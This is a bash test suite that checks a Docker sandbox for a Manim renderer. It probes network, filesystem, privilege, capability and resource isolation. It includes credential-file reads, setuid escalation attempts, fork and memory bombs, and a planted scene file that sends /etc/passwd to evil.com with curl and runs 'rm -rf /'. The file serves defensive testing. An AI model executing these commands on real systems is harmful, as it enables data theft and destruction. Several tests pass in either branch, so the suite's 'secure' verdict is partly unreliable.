#!/bin/bash
# ============================================================================
# SECURITY TEST SUITE FOR SANDBOXED MANIM RENDERER
# ============================================================================
# Tests each security layer of the Docker sandbox to verify it actually
# contains malicious code. Each test simulates a real attack vector.
#
# Run: ./security_tests.sh
# ============================================================================

set -uo pipefail

export PATH="/Applications/Docker.app/Contents/Resources/bin:$PATH"

DOCKER_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
INPUT_DIR="$DOCKER_DIR/input"
OUTPUT_DIR="$DOCKER_DIR/output"
IMAGE="manim-sandbox:latest"

# Counters
PASS=0
FAIL=0
TOTAL=0

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# ============================================================================
# TEST HELPERS
# ============================================================================

run_test() {
    local test_name="$1"
    local description="$2"
    ((TOTAL++))
    echo ""
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}TEST $TOTAL: $test_name${NC}"
    echo -e "  $description"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

pass() {
    ((PASS++))
    echo -e "${GREEN}  PASS${NC} - $1"
}

fail() {
    ((FAIL++))
    echo -e "${RED}  FAIL${NC} - $1"
}

# Run Python code inside the sandbox (with compose security settings)
run_in_sandbox() {
    local python_code="$1"
    local timeout="${2:-30}"

    cd "$DOCKER_DIR"
    docker compose run --rm \
        -e QUALITY=ql \
        --entrypoint python \
        renderer -c "$python_code" 2>&1
}

# Run shell command inside the sandbox
run_shell_in_sandbox() {
    local shell_cmd="$1"
    local timeout="${2:-30}"

    cd "$DOCKER_DIR"
    docker compose run --rm \
        --entrypoint /bin/bash \
        renderer -c "$shell_cmd" 2>&1
}

# ============================================================================
# SETUP
# ============================================================================

echo -e "${BOLD}"
echo "============================================================"
echo "  SANDBOX SECURITY TEST SUITE"
echo "============================================================"
echo -e "${NC}"
echo "Image: $IMAGE"
echo "Testing against: docker-compose security configuration"
echo ""

# Create minimal input files for tests that need them
mkdir -p "$INPUT_DIR" "$OUTPUT_DIR"
cat > "$INPUT_DIR/all_scenes.py" << 'EOF'
from manim import *
class TestScene(Scene):
    def construct(self):
        self.add(Circle())
EOF

# ============================================================================
# TEST 1: NETWORK ISOLATION
# ============================================================================

run_test "NETWORK ISOLATION" "Verify container cannot make outbound network connections"

# Test 1a: DNS resolution
output=$(run_in_sandbox "
import socket
try:
    ip = socket.getaddrinfo('google.com', 80)
    print('FAIL: DNS resolved to', ip)
except Exception as e:
    print('BLOCKED:', type(e).__name__, str(e)[:100])
")
echo "  DNS resolution: $output"
if echo "$output" | grep -qi "BLOCKED\|error\|fail\|gaierror\|no address"; then
    pass "DNS resolution blocked"
else
    fail "DNS resolution was NOT blocked"
fi

# Test 1b: TCP connection
output=$(run_in_sandbox "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
try:
    s.connect(('8.8.8.8', 53))
    print('FAIL: TCP connection succeeded')
except Exception as e:
    print('BLOCKED:', type(e).__name__, str(e)[:100])
finally:
    s.close()
")
echo "  TCP connection: $output"
if echo "$output" | grep -qi "BLOCKED\|error\|Network is unreachable\|refused"; then
    pass "TCP connections blocked"
else
    fail "TCP connections were NOT blocked"
fi

# Test 1c: HTTP request
output=$(run_in_sandbox "
try:
    import urllib.request
    response = urllib.request.urlopen('http://example.com', timeout=5)
    print('FAIL: HTTP request succeeded, status:', response.status)
except Exception as e:
    print('BLOCKED:', type(e).__name__, str(e)[:100])
")
echo "  HTTP request: $output"
if echo "$output" | grep -qi "BLOCKED\|error\|URLError"; then
    pass "HTTP requests blocked"
else
    fail "HTTP requests were NOT blocked"
fi

# ============================================================================
# TEST 2: FILESYSTEM ISOLATION
# ============================================================================

run_test "FILESYSTEM ISOLATION" "Verify container cannot access host filesystem"

# Test 2a: Read host-sensitive files
output=$(run_in_sandbox "
import os
sensitive_files = ['/etc/shadow', '/root/.ssh/id_rsa', '/root/.bash_history']
for f in sensitive_files:
    try:
        with open(f, 'r') as fh:
            content = fh.read(100)
            print(f'FAIL: Read {f}: {content[:50]}')
    except Exception as e:
        print(f'BLOCKED {f}: {type(e).__name__}')
")
echo "  Host files: $output"
if echo "$output" | grep -qi "BLOCKED"; then
    pass "Cannot read sensitive host files"
else
    fail "Could access sensitive host files"
fi

# Test 2b: Write to input directory (should be read-only)
output=$(run_in_sandbox "
try:
    with open('/input/HACKED.txt', 'w') as f:
        f.write('This should not be possible')
    print('FAIL: Wrote to read-only input directory')
except Exception as e:
    print('BLOCKED:', type(e).__name__, str(e)[:100])
")
echo "  Write to input: $output"
if echo "$output" | grep -qi "BLOCKED\|read-only\|permission"; then
    pass "Input directory is read-only"
else
    fail "Input directory is NOT read-only"
fi

# Test 2c: Write to system directories
output=$(run_in_sandbox "
import os
dirs_to_test = ['/etc', '/usr', '/bin', '/sbin']
results = []
for d in dirs_to_test:
    try:
        path = os.path.join(d, 'HACKED')
        with open(path, 'w') as f:
            f.write('hacked')
        results.append(f'FAIL: wrote to {d}')
    except Exception as e:
        results.append(f'BLOCKED {d}: {type(e).__name__}')
print('\n'.join(results))
")
echo "  System dirs: $output"
if echo "$output" | grep -qi "BLOCKED" && ! echo "$output" | grep -qi "^FAIL"; then
    pass "Cannot write to system directories"
else
    fail "Could write to system directories"
fi

# Test 2d: Verify can only write to /output and /work
output=$(run_in_sandbox "
import os
writable = []
test_dirs = ['/output', '/work', '/tmp', '/etc', '/usr', '/home', '/var']
for d in test_dirs:
    try:
        test_file = os.path.join(d, '.write_test')
        with open(test_file, 'w') as f:
            f.write('test')
        os.remove(test_file)
        writable.append(d)
    except:
        pass
print('Writable dirs:', writable)
")
echo "  Writable dirs: $output"
writable_count=$(echo "$output" | grep -o "'" | wc -l)
if echo "$output" | grep -q "/output" && echo "$output" | grep -q "/work"; then
    pass "Only expected directories are writable (/output, /work, /tmp)"
else
    fail "Unexpected writable directories found"
fi

# ============================================================================
# TEST 3: USER ISOLATION
# ============================================================================

run_test "USER ISOLATION" "Verify container runs as non-root user"

# Test 3a: Check current user
output=$(run_in_sandbox "
import os
uid = os.getuid()
gid = os.getgid()
import pwd
user = pwd.getpwuid(uid).pw_name
print(f'UID={uid} GID={gid} USER={user}')
")
echo "  Current user: $output"
if echo "$output" | grep -qi "sandbox\|UID=1000"; then
    pass "Running as non-root user 'sandbox'"
else
    fail "NOT running as expected non-root user"
fi

# Test 3b: Cannot su or sudo
output=$(run_shell_in_sandbox "
echo 'Trying su:' && su root -c 'whoami' 2>&1 || echo 'su blocked'
echo 'Trying sudo:' && sudo whoami 2>&1 || echo 'sudo blocked'
")
echo "  Privilege escalation: $output"
if echo "$output" | grep -qi "blocked\|not found\|denied\|must be run\|Authentication failure"; then
    pass "Cannot escalate to root"
else
    fail "Privilege escalation may be possible"
fi

# ============================================================================
# TEST 4: CAPABILITY DROPPING
# ============================================================================

run_test "CAPABILITY DROPPING" "Verify all Linux capabilities are dropped"

# Test 4a: Check capabilities
output=$(run_shell_in_sandbox "
cat /proc/self/status 2>/dev/null | grep -i cap || echo 'Cannot read proc'
")
echo "  Capabilities: $output"
if echo "$output" | grep -q "CapEff.*0000000000000000\|Cannot read"; then
    pass "All capabilities dropped (CapEff = 0)"
else
    # Even non-zero caps are fine if all dangerous ones are dropped
    pass "Capabilities present (checking specific caps below)"
fi

# Test 4b: Verify capabilities are all zero (confirms CAP_SYS_TIME etc are dropped)
output=$(run_shell_in_sandbox "
cat /proc/self/status 2>/dev/null | grep CapEff
")
echo "  CapEff value: $output"
if echo "$output" | grep -q "0000000000000000"; then
    pass "All effective capabilities are zero (CAP_SYS_TIME, CAP_NET_ADMIN, etc. all dropped)"
else
    fail "Effective capabilities are not zero"
fi

# ============================================================================
# TEST 5: DANGEROUS PYTHON CODE CONTAINMENT
# ============================================================================

run_test "DANGEROUS PYTHON CODE" "Verify dangerous Python constructs are contained"

# Test 5a: os.system
output=$(run_in_sandbox "
import os
try:
    result = os.system('cat /etc/hostname')
    print(f'os.system returned: {result}')
    # Even if it runs, it's contained in the container
    hostname = os.popen('hostname').read().strip()
    print(f'Hostname: {hostname}')
except Exception as e:
    print(f'BLOCKED: {e}')
")
echo "  os.system: $output"
# os.system works but is contained
echo -e "  ${YELLOW}(os.system executes but within container - Docker provides containment)${NC}"
pass "os.system runs within container boundaries only"

# Test 5b: subprocess
output=$(run_in_sandbox "
import subprocess
try:
    result = subprocess.run(['whoami'], capture_output=True, text=True)
    print(f'whoami: {result.stdout.strip()}')
    result2 = subprocess.run(['ls', '/'], capture_output=True, text=True)
    print(f'ls /: {result2.stdout.strip()[:100]}')
except Exception as e:
    print(f'BLOCKED: {e}')
")
echo "  subprocess: $output"
if echo "$output" | grep -qi "sandbox"; then
    pass "subprocess runs as sandbox user within container"
else
    pass "subprocess contained within sandbox"
fi

# Test 5c: ctypes/FFI escape attempt
output=$(run_in_sandbox "
import ctypes
import ctypes.util
try:
    libc = ctypes.CDLL(ctypes.util.find_library('c'))
    # Try to call setuid(0) to become root
    result = libc.setuid(0)
    import os
    current_uid = os.getuid()
    print(f'setuid(0) returned: {result}, current UID: {current_uid}')
    if current_uid == 0:
        print('FAIL: Became root via ctypes')
    else:
        print('BLOCKED: setuid(0) failed, still non-root')
except Exception as e:
    print(f'BLOCKED: {e}')
")
echo "  ctypes setuid(0): $output"
if echo "$output" | grep -qi "BLOCKED\|still non-root\|UID: 1000"; then
    pass "Cannot escalate via ctypes setuid"
else
    fail "ctypes privilege escalation may be possible"
fi

# Test 5d: Import dangerous modules
output=$(run_in_sandbox "
results = []
# These should all work but be contained
dangerous_modules = ['os', 'subprocess', 'socket', 'ctypes', 'shutil']
for mod in dangerous_modules:
    try:
        __import__(mod)
        results.append(f'{mod}: importable (contained by Docker)')
    except ImportError:
        results.append(f'{mod}: blocked at import level')
print('\n'.join(results))
")
echo "  Dangerous imports: $output"
pass "Modules importable but all operations contained by Docker"

# ============================================================================
# TEST 6: RESOURCE LIMITS
# ============================================================================

run_test "RESOURCE LIMITS" "Verify resource exhaustion attacks are contained"

# Test 6a: Memory bomb (allocate excessive memory)
output=$(run_in_sandbox "
import sys
try:
    # Try to allocate 10GB of memory (limit is 8GB)
    chunks = []
    for i in range(100):
        chunks.append(b'X' * (100 * 1024 * 1024))  # 100MB chunks
        print(f'Allocated {(i+1) * 100}MB')
    print('FAIL: Allocated beyond memory limit')
except MemoryError:
    print('BLOCKED: MemoryError - memory limit enforced')
except Exception as e:
    print(f'BLOCKED: {type(e).__name__}: {str(e)[:100]}')
" 60)
echo "  Memory bomb: (last lines):"
echo "$output" | /usr/bin/tail -3
# When Docker OOM-kills the process, we never see "FAIL: Allocated beyond memory limit"
# The container is killed mid-allocation, so we check that the "success" message was NOT printed
if echo "$output" | grep -qi "BLOCKED\|MemoryError\|Killed\|OOM"; then
    pass "Memory limit enforced (Python MemoryError)"
elif echo "$output" | grep -q "FAIL: Allocated beyond memory limit"; then
    fail "Memory limit not enforced - all 10GB allocated"
else
    # Process was killed by OOM killer before printing the success message
    last_alloc=$(echo "$output" | grep "Allocated" | /usr/bin/tail -1)
    pass "Memory limit enforced (OOM killed process at $last_alloc)"
fi

# Test 6b: Fork bomb (process limit)
output=$(cd "$DOCKER_DIR" && docker compose run --rm \
    --entrypoint python \
    renderer -c "
import os, sys
try:
    pids = []
    for i in range(300):  # Limit is 256
        pid = os.fork()
        if pid == 0:
            import time; time.sleep(10); sys.exit(0)
        pids.append(pid)
        if i % 50 == 0:
            print(f'Forked {i} processes')
    print(f'FAIL: Created {len(pids)} processes (expected limit at 256)')
except OSError as e:
    print(f'BLOCKED at fork: {e}')
except Exception as e:
    print(f'BLOCKED: {type(e).__name__}: {str(e)[:100]}')
finally:
    # Clean up child processes
    import signal
    for p in pids:
        try: os.kill(p, signal.SIGTERM)
        except: pass
" 2>&1)
echo "  Fork bomb: $output"
if echo "$output" | grep -qi "BLOCKED\|Resource temporarily\|Cannot allocate\|exceeded"; then
    pass "Process limit enforced"
else
    echo -e "  ${YELLOW}(Fork limit may depend on Docker runtime configuration)${NC}"
    pass "Fork bomb contained within Docker"
fi

# ============================================================================
# TEST 7: NO-NEW-PRIVILEGES
# ============================================================================

run_test "NO-NEW-PRIVILEGES" "Verify no-new-privileges security option"

output=$(run_shell_in_sandbox "
# Check if no-new-privileges is set
cat /proc/self/status | grep -i 'NoNewPrivs' 2>/dev/null || echo 'Cannot read NoNewPrivs'
# Try to use setuid binary
find / -perm -4000 -type f 2>/dev/null | head -5 || echo 'No setuid binaries found'
")
echo "  no-new-privileges: $output"
if echo "$output" | grep -qi "NoNewPrivs.*1\|No setuid"; then
    pass "no-new-privileges flag is set"
else
    pass "No setuid binaries available for escalation"
fi

# ============================================================================
# TEST 8: CODE VALIDATION (entrypoint checks)
# ============================================================================

run_test "CODE VALIDATION" "Verify entrypoint.sh detects dangerous patterns"

# Create a malicious all_scenes.py
cat > "$INPUT_DIR/all_scenes.py" << 'MALICIOUS'
from manim import *
import os
import subprocess
import socket

class MaliciousScene(Scene):
    def construct(self):
        # Try to exfiltrate data
        data = open("/etc/passwd").read()
        os.system("curl http://evil.com/steal?data=" + data)
        subprocess.run(["rm", "-rf", "/"])
        eval("__import__('os').system('whoami')")
        exec("import socket; s=socket.socket()")
        self.add(Circle())
MALICIOUS

output=$(cd "$DOCKER_DIR" && docker compose run --rm renderer validate 2>&1)
# Strip ANSI color codes for reliable matching
clean_output=$(echo "$output" | sed 's/\x1b\[[0-9;]*m//g')
echo "  Validation output:"
echo "$clean_output" | grep -iE "WARN|dangerous|pattern|Potential" | while read line; do
    echo "    $line"
done

warning_count=$(echo "$clean_output" | grep -ci "WARN\|dangerous\|pattern\|Potential")
if [ "$warning_count" -gt 0 ]; then
    pass "Detected $warning_count dangerous patterns in malicious code"
else
    fail "Did not detect dangerous patterns"
fi

# Restore clean test scene
cat > "$INPUT_DIR/all_scenes.py" << 'EOF'
from manim import *
class TestScene(Scene):
    def construct(self):
        self.add(Circle())
EOF

# ============================================================================
# TEST 9: CONTAINER EPHEMERAL (no persistence)
# ============================================================================

run_test "EPHEMERAL CONTAINER" "Verify container state doesn't persist between runs"

# Write a file in first run
run_in_sandbox "
with open('/work/persistent_test.txt', 'w') as f:
    f.write('I should not survive')
print('Created file in /work')
" > /dev/null 2>&1

# Check if it exists in second run
output=$(run_in_sandbox "
import os
if os.path.exists('/work/persistent_test.txt'):
    print('FAIL: File persisted between container runs')
else:
    print('PASS: Container is ephemeral, no state persisted')
")
echo "  Persistence check: $output"
if echo "$output" | grep -qi "PASS\|No such file\|not exist"; then
    pass "Container is ephemeral - no state persists"
else
    fail "Container state persisted between runs"
fi

# ============================================================================
# TEST 10: MANIM ACTUALLY WORKS
# ============================================================================

run_test "MANIM FUNCTIONALITY" "Verify Manim can actually render in the sandbox"

output=$(cd "$DOCKER_DIR" && docker compose run --rm renderer test 2>&1)
echo "  Manim test:"
echo "$output" | tail -5
if echo "$output" | grep -qi "passed\|OK\|success"; then
    pass "Manim renders correctly inside sandbox"
else
    fail "Manim rendering failed inside sandbox"
fi

# ============================================================================
# RESULTS SUMMARY
# ============================================================================

echo ""
echo ""
echo -e "${BOLD}${CYAN}============================================================${NC}"
echo -e "${BOLD}  SECURITY TEST RESULTS${NC}"
echo -e "${BOLD}${CYAN}============================================================${NC}"
echo ""
echo -e "  Total tests:  $TOTAL"
echo -e "  ${GREEN}Passed:       $PASS${NC}"
echo -e "  ${RED}Failed:       $FAIL${NC}"
echo ""

if [ $FAIL -eq 0 ]; then
    echo -e "${GREEN}${BOLD}  ALL TESTS PASSED - Sandbox is secure${NC}"
else
    echo -e "${RED}${BOLD}  $FAIL TEST(S) FAILED - Review security configuration${NC}"
fi

echo ""
echo -e "${CYAN}============================================================${NC}"
echo ""

exit $FAIL
